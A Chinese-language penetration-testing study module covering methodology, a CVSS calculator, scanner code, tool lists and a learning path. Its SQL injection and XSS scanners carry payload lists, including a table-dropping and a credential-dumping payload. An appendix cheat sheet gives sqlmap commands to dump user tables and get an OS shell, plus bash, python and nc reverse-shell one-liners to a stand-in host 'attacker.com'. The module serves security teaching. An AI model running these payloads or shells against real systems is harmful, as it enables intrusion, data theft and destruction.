# C02 渗透测试 (Penetration Testing)

## 1. 主题定位

### 1.1 定义
渗透测试（Penetration Testing，简称 Pentest）是模拟黑客攻击手段，在授权情况下对目标系统进行安全性评估的过程。通过发现系统的安全漏洞并验证其可利用性，帮助组织了解安全态势并修复风险。

### 1.2 核心价值
- **漏洞发现**: 识别系统、网络、应用中的安全弱点
- **风险量化**: 评估漏洞被利用后的实际影响
- **合规验证**: 满足 PCI-DSS、ISO27001 等标准的测试要求
- **防御增强**: 验证安全控制措施的有效性

### 1.3 测试类型
| 类型 | 特点 | 适用场景 |
|------|------|----------|
| 黑盒测试 | 无内部信息，模拟外部攻击者 | 评估外部防御能力 |
| 白盒测试 | 完整信息访问，深度代码审计 | 全面安全评估 |
| 灰盒测试 | 部分信息，模拟内部威胁 | 平衡效率与深度 |

---

## 2. 核心概念

### 2.1 渗透测试方法论

#### 2.1.1 PTES (Penetration Testing Execution Standard)
```
渗透测试标准执行流程：
┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│ 1. 前期交互 │ -> │ 2. 情报收集 │ -> │ 3. 威胁建模 │
└─────────────┘    └─────────────┘    └─────────────┘
                                              |
┌─────────────┐    ┌─────────────┐    ┌─────┴─────┐
│ 6. 报告输出 │ <- │ 5. 后渗透   │ <- │ 4. 漏洞分析 │
└─────────────┘    └─────────────┘    └───────────┘
```

#### 2.1.2 OWASP Testing Guide
```python
#!/usr/bin/env python3
"""OWASP Web 测试检查清单生成器"""

from dataclasses import dataclass
from typing import List, Optional
from enum import Enum

class RiskLevel(Enum):
    CRITICAL = "严重"
    HIGH = "高危"
    MEDIUM = "中危"
    LOW = "低危"
    INFO = "信息"

@dataclass
class TestCase:
    id: str
    name: str
    description: str
    risk_level: RiskLevel
    owasp_category: str
    tools: List[str]
    verification_steps: List[str]

class OWASPTestingGuide:
    """OWASP Web 安全测试指南 V4.2 实现"""
    
    TEST_CASES = [
        TestCase(
            id="OTG-INFO-001",
            name="搜索引擎信息收集",
            description="通过搜索引擎发现目标暴露的信息",
            risk_level=RiskLevel.INFO,
            owasp_category="信息收集",
            tools=["Google Dorks", "Shodan", "Censys", "theHarvester"],
            verification_steps=[
                "执行 site:target.com 搜索",
                "使用 filetype: 查找敏感文件",
                "检查缓存页面中的敏感信息",
                "搜索泄露的 API 密钥、密码"
            ]
        ),
        TestCase(
            id="OTG-INFO-006",
            name="应用程序入口识别",
            description="发现所有应用程序入口点",
            risk_level=RiskLevel.MEDIUM,
            owasp_category="信息收集",
            tools=["Burp Suite", "OWASP ZAP", "dirsearch", "gobuster"],
            verification_steps=[
                "目录和文件爆破",
                "API 端点枚举",
                "参数发现 (fuzzing)",
                "JS 文件分析提取端点"
            ]
        ),
        TestCase(
            id="OTG-AUTHN-001",
            name="凭证传输加密测试",
            description="验证凭证传输的安全性",
            risk_level=RiskLevel.CRITICAL,
            owasp_category="认证",
            tools=["Burp Suite", "Wireshark", "SSL Labs"],
            verification_steps=[
                "检查 HTTPS 强制使用",
                "验证 HSTS 头",
                "检查凭证是否明文传输",
                "验证会话 Cookie 安全属性"
            ]
        ),
        TestCase(
            id="OTG-INPVAL-005",
            name="SQL 注入测试",
            description="测试 SQL 注入漏洞",
            risk_level=RiskLevel.CRITICAL,
            owasp_category="输入验证",
            tools=["SQLMap", "Burp Suite", "NoSQLMap"],
            verification_steps=[
                "测试单引号错误",
                "使用 UNION 注入",
                "测试盲注 (布尔/时间)",
                "尝试堆叠查询"
            ]
        ),
        TestCase(
            id="OTG-INPVAL-001",
            name="反射型 XSS 测试",
            description="测试反射型跨站脚本",
            risk_level=RiskLevel.HIGH,
            owasp_category="输入验证",
            tools=["XSStrike", "dalfox", "Burp Suite"],
            verification_steps=[
                "测试基本脚本标签",
                "测试事件处理器",
                "测试编码绕过",
                "测试 DOM 型 XSS"
            ]
        ),
    ]
    
    def generate_checklist(self) -> str:
        """生成测试检查清单"""
        output = []
        output.append("=" * 80)
        output.append("OWASP Web 安全测试检查清单 V4.2")
        output.append("=" * 80)
        output.append("")
        
        current_category = ""
        for test in self.TEST_CASES:
            if test.owasp_category != current_category:
                current_category = test.owasp_category
                output.append(f"\n## {current_category}")
                output.append("-" * 80)
            
            output.append(f"\n[{test.id}] {test.name}")
            output.append(f"风险级别: {test.risk_level.value}")
            output.append(f"描述: {test.description}")
            output.append(f"推荐工具: {', '.join(test.tools)}")
            output.append("验证步骤:")
            for i, step in enumerate(test.verification_steps, 1):
                output.append(f"  {i}. {step}")
            output.append("")
        
        return "\n".join(output)
```

### 2.2 漏洞分类体系 - CVSS 评分

```python
#!/usr/bin/env python3
"""CVSS v3.1 评分计算器"""

from dataclasses import dataclass

@dataclass
class CVSS3Score:
    """CVSS v3.1 评分计算器"""
    
    attack_vector: str  # N/A/L/P
    attack_complexity: str  # L/H
    privileges_required: str  # N/L/H
    user_interaction: str  # N/R
    scope: str  # U/C
    confidentiality: str  # N/L/H
    integrity: str  # N/L/H
    availability: str  # N/L/H
    
    # 评分映射
    AV_MAP = {'N': 0.85, 'A': 0.62, 'L': 0.55, 'P': 0.2}
    AC_MAP = {'L': 0.77, 'H': 0.44}
    PR_MAP_U = {'N': 0.85, 'L': 0.62, 'H': 0.27}
    PR_MAP_C = {'N': 0.85, 'L': 0.68, 'H': 0.5}
    UI_MAP = {'N': 0.85, 'R': 0.62}
    CIA_MAP = {'N': 0.0, 'L': 0.22, 'H': 0.56}
    
    def calculate_base_score(self) -> float:
        """计算基础评分"""
        av = self.AV_MAP[self.attack_vector]
        ac = self.AC_MAP[self.attack_complexity]
        pr_map = self.PR_MAP_C if self.scope == 'C' else self.PR_MAP_U
        pr = pr_map[self.privileges_required]
        ui = self.UI_MAP[self.user_interaction]
        c = self.CIA_MAP[self.confidentiality]
        i = self.CIA_MAP[self.integrity]
        a = self.CIA_MAP[self.availability]
        
        # 影响子评分 (ISS)
        iss = 1 - ((1 - c) * (1 - i) * (1 - a))
        
        # 影响评分
        if self.scope == 'U':
            impact = 6.42 * iss
        else:
            impact = 7.52 * (iss - 0.029) - 3.25 * (iss - 0.02) ** 15
        
        # 可利用性评分
        exploitability = 8.22 * av * ac * pr * ui
        
        # 基础评分
        if impact <= 0:
            base_score = 0.0
        elif self.scope == 'U':
            base_score = min((impact + exploitability), 10)
        else:
            base_score = min(1.08 * (impact + exploitability), 10)
        
        return round(base_score, 1)
    
    def get_severity(self) -> str:
        """获取严重等级"""
        score = self.calculate_base_score()
        if score == 0.0:
            return "None"
        elif score < 4.0:
            return "Low"
        elif score < 7.0:
            return "Medium"
        elif score < 9.0:
            return "High"
        else:
            return "Critical"


# SQL 注入示例评分
sqli = CVSS3Score(
    attack_vector='N', attack_complexity='L', privileges_required='L',
    user_interaction='N', scope='U', confidentiality='H', integrity='H', availability='H'
)
print(f"SQL 注入 CVSS 评分: {sqli.calculate_base_score()} ({sqli.get_severity()})")
```

---

## 3. 技术实践

### 3.1 自动化渗透测试脚本

```python
#!/usr/bin/env python3
"""自动化渗透测试框架示例"""

import subprocess
import json
import asyncio
from datetime import datetime
from dataclasses import dataclass
from pathlib import Path

@dataclass
class ScanResult:
    tool: str
    target: str
    status: str
    findings: list

class PentestAutomation:
    """自动化渗透测试框架"""
    
    def __init__(self, output_dir: str = "./results"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
    
    async def run_subfinder(self, target: str) -> ScanResult:
        """子域名枚举"""
        output_file = self.output_dir / f"subfinder_{target}.txt"
        cmd = ["subfinder", "-d", target, "-o", str(output_file), "-silent"]
        
        try:
            process = await asyncio.create_subprocess_exec(*cmd)
            await process.communicate()
            
            subdomains = []
            if output_file.exists():
                subdomains = output_file.read_text().strip().split('\n')
            
            return ScanResult(
                tool="subfinder",
                target=target,
                status="completed",
                findings=subdomains
            )
        except Exception as e:
            return ScanResult(tool="subfinder", target=target, status="failed", findings=[str(e)])
    
    async def run_nmap(self, target: str) -> ScanResult:
        """端口扫描"""
        output_file = self.output_dir / f"nmap_{target}.xml"
        cmd = [
            "nmap", "-sS", "-sV", "--top-ports=1000",
            "-T4", "-oX", str(output_file), target
        ]
        
        try:
            process = await asyncio.create_subprocess_exec(*cmd)
            await process.communicate()
            return ScanResult(tool="nmap", target=target, status="completed", findings=[])
        except Exception as e:
            return ScanResult(tool="nmap", target=target, status="failed", findings=[str(e)])
    
    async def run_nuclei(self, target: str) -> ScanResult:
        """漏洞扫描"""
        cmd = ["nuclei", "-u", target, "-json"]
        
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE
            )
            stdout, _ = await process.communicate()
            
            findings = []
            for line in stdout.decode().strip().split('\n'):
                if line:
                    findings.append(json.loads(line))
            
            return ScanResult(tool="nuclei", target=target, status="completed", findings=findings)
        except Exception as e:
            return ScanResult(tool="nuclei", target=target, status="failed", findings=[str(e)])
    
    async def full_scan(self, target: str):
        """执行完整扫描"""
        results = await asyncio.gather(
            self.run_subfinder(target),
            self.run_nmap(target),
            self.run_nuclei(target)
        )
        return results
```

### 3.2 SQL 注入检测工具

```python
#!/usr/bin/env python3
"""SQL 注入检测工具"""

import requests
import re
from urllib.parse import urljoin, parse_qs, urlparse
from typing import List, Dict

class SQLInjectionScanner:
    """SQL 注入漏洞扫描器"""
    
    ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"PostgreSQL.*ERROR",
        r"Oracle.*ORA-[0-9]{5}",
        r"Microsoft SQL Server.*Error",
        r"ODBC SQL Server Driver",
    ]
    
    PAYLOADS = [
        "'",
        "''",
        "1' OR '1'='1",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "1 UNION SELECT null--",
        "' UNION SELECT username,password FROM users--",
        "1; DROP TABLE users--",
        "1' WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--",
    ]
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'SecurityScanner/1.0'
        })
        self.vulnerabilities = []
    
    def scan_url(self, url: str) -> List[Dict]:
        """扫描单个 URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        findings = []
        
        for param in params:
            for payload in self.PAYLOADS:
                test_url = url.replace(
                    f"{param}={params[param][0]}",
                    f"{param}={requests.utils.quote(payload)}"
                )
                
                try:
                    response = self.session.get(test_url, timeout=10)
                    
                    # 检查错误模式
                    for pattern in self.ERROR_PATTERNS:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            findings.append({
                                'type': 'SQL Injection',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': 'Database error detected',
                                'severity': 'Critical'
                            })
                            break
                    
                    # 布尔盲注检测
                    true_payload = f"{param}=1 AND 1=1"
                    false_payload = f"{param}=1 AND 1=2"
                    
                    resp_true = self.session.get(url.replace(f"{param}={params[param][0]}", true_payload))
                    resp_false = self.session.get(url.replace(f"{param}={params[param][0]}", false_payload))
                    
                    if resp_true.text != resp_false.text:
                        findings.append({
                            'type': 'Blind SQL Injection (Boolean)',
                            'url': url,
                            'parameter': param,
                            'severity': 'Critical'
                        })
                        
                except Exception as e:
                    continue
        
        return findings
    
    def scan_forms(self, form_data: Dict) -> List[Dict]:
        """扫描表单"""
        findings = []
        
        for payload in self.PAYLOADS:
            data = {field: payload for field in form_data.get('fields', [])}
            
            try:
                if form_data.get('method', 'GET').upper() == 'POST':
                    response = self.session.post(form_data['action'], data=data)
                else:
                    response = self.session.get(form_data['action'], params=data)
                
                for pattern in self.ERROR_PATTERNS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        findings.append({
                            'type': 'SQL Injection (Form)',
                            'url': form_data['action'],
                            'payload': payload,
                            'severity': 'Critical'
                        })
                        break
            except:
                pass
        
        return findings


# 使用示例
if __name__ == '__main__':
    scanner = SQLInjectionScanner("http://target.com")
    # 仅在授权环境下使用
    # results = scanner.scan_url("http://target.com/page?id=1")
    # print(json.dumps(results, indent=2))
```

### 3.3 XSS 漏洞检测工具

```python
#!/usr/bin/env python3
"""XSS 漏洞检测工具"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import re

class XSSScanner:
    """XSS 漏洞扫描器"""
    
    PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
    ]
    
    DOM_PAYLOADS = [
        "#<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
    ]
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0'
        })
    
    def scan_reflected_xss(self, url: str) -> list:
        """扫描反射型 XSS"""
        findings = []
        parsed = requests.utils.urlparse(url)
        params = requests.utils.parse_qs(parsed.query)
        
        for param in params:
            for payload in self.PAYLOADS:
                test_url = url.replace(
                    f"{param}={params[param][0]}",
                    f"{param}={requests.utils.quote(payload)}"
                )
                
                try:
                    response = self.session.get(test_url, timeout=10)
                    
                    # 检查 payload 是否被反射
                    if payload in response.text:
                        # 检查是否被正确编码
                        if not self._is_properly_encoded(response.text, payload):
                            findings.append({
                                'type': 'Reflected XSS',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'severity': 'High'
                            })
                except:
                    continue
        
        return findings
    
    def scan_stored_xss(self, url: str, form_data: dict) -> list:
        """扫描存储型 XSS"""
        findings = []
        
        for payload in self.PAYLOADS:
            data = {k: payload for k in form_data.get('fields', [])}
            
            try:
                # 提交 payload
                if form_data.get('method') == 'POST':
                    self.session.post(form_data['action'], data=data)
                else:
                    self.session.get(form_data['action'], params=data)
                
                # 重新访问页面检查 payload 是否被存储
                response = self.session.get(url)
                if payload in response.text:
                    findings.append({
                        'type': 'Stored XSS',
                        'url': url,
                        'payload': payload,
                        'severity': 'Critical'
                    })
            except:
                pass
        
        return findings
    
    def scan_dom_xss(self, url: str) -> list:
        """扫描 DOM 型 XSS"""
        findings = []
        
        # 检查 URL 片段处理
        for payload in self.DOM_PAYLOADS:
            test_url = f"{url}{payload}"
            try:
                response = self.session.get(test_url, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # 检查危险的 sink
                scripts = soup.find_all('script')
                for script in scripts:
                    if script.string:
                        dangerous_sinks = [
                            'document.write',
                            'innerHTML',
                            'eval',
                            'setTimeout',
                            'location.href',
                            'location.replace'
                        ]
                        for sink in dangerous_sinks:
                            if sink in script.string:
                                findings.append({
                                    'type': 'DOM XSS',
                                    'url': url,
                                    'sink': sink,
                                    'severity': 'High'
                                })
            except:
                pass
        
        return findings
    
    def _is_properly_encoded(self, content: str, payload: str) -> bool:
        """检查 payload 是否被正确编码"""
        # 检查 HTML 实体编码
        encoded_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
        if encoded_payload in content:
            return True
        
        # 检查是否被 JavaScript 编码
        if '\\u003c' in content or '\\x3c' in content:
            return True
        
        return False


# 使用示例
if __name__ == '__main__':
    scanner = XSSScanner("http://target.com")
    # 仅在授权环境下使用
    # results = scanner.scan_reflected_xss("http://target.com/search?q=test")
```

---

## 4. 资源索引

### 4.1 推荐书籍

| 书名 | 作者 | 难度 | 重点内容 |
|------|------|------|----------|
| 《Metasploit 渗透测试指南》 | David Kennedy | ⭐⭐⭐ | Metasploit 框架使用 |
| 《渗透测试实践指南》 | Patrick Engebretson | ⭐⭐ | 入门到精通 |
| 《黑客攻防技术宝典》 | Dafydd Stuttard | ⭐⭐⭐⭐ | Web 渗透测试 |
| 《内网渗透体系建设》 | 徐焱 | ⭐⭐⭐⭐ | 内网渗透技术 |
| 《Kali Linux 渗透测试的艺术》 | 李华峰 | ⭐⭐⭐ | Kali 工具链 |

### 4.2 在线资源

- **OWASP Testing Guide**
  - URL: https://owasp.org/www-project-web-security-testing-guide/
  - Web 应用安全测试标准

- **Hack The Box**
  - URL: https://www.hackthebox.com/
  - 在线渗透测试练习平台

- **TryHackMe**
  - URL: https://tryhackme.com/
  - 初学者友好的学习平台

- **VulnHub**
  - URL: https://www.vulnhub.com/
  - 可下载的漏洞虚拟机

- **CTFtime**
  - URL: https://ctftime.org/
  - CTF 竞赛日历和排名

### 4.3 开源工具

| 工具 | 用途 | 链接 |
|------|------|------|
| Metasploit | 渗透测试框架 | https://www.metasploit.com/ |
| Burp Suite | Web 应用安全测试 | https://portswigger.net/burp |
| Nmap | 网络扫描 | https://nmap.org/ |
| SQLMap | SQL 注入自动化 | https://sqlmap.org/ |
| Nuclei | 漏洞扫描器 | https://nuclei.projectdiscovery.io/ |
| Cobalt Strike | 红队框架 | https://www.cobaltstrike.com/ |
| BloodHound | 域渗透分析 | https://github.com/BloodHoundAD/BloodHound |

---

## 5. 关联知识

### 5.1 相关领域

```
A04_Security_Quality/B01_Information_Security/
├── C02_Penetration_Testing (本模块)
│   ├── → C01_Cryptography: 加密破解与防御
│   └── → C03_Secure_Coding: 漏洞成因分析
│
├── → B02_Reliability_Evaluation: 红队演练
├── → B03_Maintenance_Ops/C01_Incident_Response: 攻击溯源
└── → B04_Quality_Assurance/C01_Test_Automation: 安全测试自动化
```

### 5.2 技术栈关联

| 技术 | 应用场景 | 与本模块关系 |
|------|----------|--------------|
| MITRE ATT&CK | 攻击技术知识库 | 测试方法参考 |
| Cyber Kill Chain | 攻击生命周期 | 测试阶段规划 |
| Purple Team | 红蓝对抗 | 验证防御有效性 |
| DevSecOps | 安全左移 | 自动化安全测试 |

---

## 6. 学习建议

### 6.1 学习路径

#### 初级 (1-3 个月)
1. 学习 Linux 基础和网络协议
2. 掌握 Nmap、Burp Suite 基本使用
3. 理解常见漏洞原理 (OWASP Top 10)
4. 完成 TryHackMe 入门路径

#### 中级 (3-6 个月)
1. 深入学习 Web 漏洞挖掘
2. 掌握 Metasploit 框架
3. 学习内网渗透技术
4. 参加 CTF 比赛

#### 高级 (6-12 个月)
1. 研究 0day 漏洞挖掘
2. 掌握免杀和权限维持
3. 学习代码审计
4. 参与红队演练

### 6.2 实践项目

| 难度 | 项目 | 技能点 |
|------|------|--------|
| ⭐ | 搭建 DVWA 靶场 | 基础漏洞利用 |
| ⭐⭐ | 编写简单扫描器 | Python + 网络编程 |
| ⭐⭐⭐ | 内网渗透测试 | AD 攻击、横向移动 |
| ⭐⭐⭐⭐ | 漏洞挖掘与报告 | 0day 研究 |

### 6.3 认证推荐

- **OSCP**: Offensive Security Certified Professional
- **CEH**: Certified Ethical Hacker
- **GPEN**: GIAC Penetration Tester
- **GXPN**: GIAC Exploit Researcher and Advanced Penetration Tester

### 6.4 法律与道德

⚠️ **重要提醒**:
- 仅在授权范围内进行测试
- 遵守《网络安全法》等法律法规
- 保护测试过程中获取的敏感信息
- 及时报告发现的漏洞

---

## 附录：渗透测试速查表

### 常用端口与服务

| 端口 | 服务 | 常见漏洞 |
|------|------|----------|
| 21 | FTP | 匿名登录、弱密码 |
| 22 | SSH | 弱密码、密钥泄露 |
| 80/443 | HTTP/HTTPS | Web 漏洞 |
| 3306 | MySQL | SQL 注入、弱密码 |
| 3389 | RDP | BlueKeep、弱密码 |
| 445 | SMB | EternalBlue |
| 6379 | Redis | 未授权访问 |

### SQLMap 常用命令

```bash
# 基本扫描
sqlmap -u "http://target.com/page?id=1"

# 获取数据库
sqlmap -u "http://target.com/page?id=1" --dbs

# 获取表
sqlmap -u "http://target.com/page?id=1" -D database --tables

# 获取数据
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

# 获取 Shell
sqlmap -u "http://target.com/page?id=1" --os-shell
```

### 常用反弹 Shell

```bash
# Bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# NC
nc -e /bin/sh attacker.com 4444
```

---

*最后更新: 2024-01-30*
*维护者: Security Team*
*审核周期: 季度更新*
